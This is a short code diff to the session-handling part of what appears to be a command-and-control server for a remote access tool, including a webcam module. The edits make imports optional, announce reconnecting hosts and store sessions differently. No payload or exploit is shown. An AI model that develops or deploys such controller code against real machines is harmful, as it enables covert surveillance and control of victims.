@@ -23,15 +23,20 @@ import subprocess
 import collections
 import multiprocessing
 
-# packages
-import cv2
-import colorama
-import SocketServer
-
 # modules
 import core.util as util
 import core.database as database
 import core.security as security
+
+# packages
+try:
+    import cv2
+except ImportError:
+    util.log("Warning: missing package 'cv2' is required for 'webcam' module")
+try:
+    import colorama
+except ImportError:
+    sys.exit("Error: missing package 'colorama' is required")
 
 # globals
 __threads = {}
@@ -732,7 +737,6 @@ class C2():
             self.database.update_status(session.get('uid'), 0)
             session['online'] = False
             self.sessions[session.get('id')] = { "info": session, "connection": None }
-        self._count = 1 if not len(self.sessions) else (max(self.sessions.keys()) + 1)
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
@@ -747,14 +751,17 @@ class C2():
                         util.display(str(session.id), color='white', style='normal')
                         util.display("    Started:", color='white', style='bright', end=',')
                         util.display(time.ctime(session._created) + "\n", color='white', style='normal')
-                        self.sessions[int(session.id)] = session
                         self._count += 1
+                    else:
+                        util.display("\n\n[+]", color='green', style='bright', end=',')
+                        util.display("{} reconnected".format(address[0]), color='white', style='bright', end=',')
                     session.info = info
+                    self.sessions[int(session.id)] = session
             else:
                 util.display("\n\n[-]", color='red', style='bright', end=',')
                 util.display("Failed Connection:", color='white', style='bright', end=',')
                 util.display(address[0], color='white', style='normal')
-            prompt = self.current_session._prompt if self.current_session else self._prompt
+            prompt = '\n\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             sys.stdout.flush()
             abort = globals()['__abort']
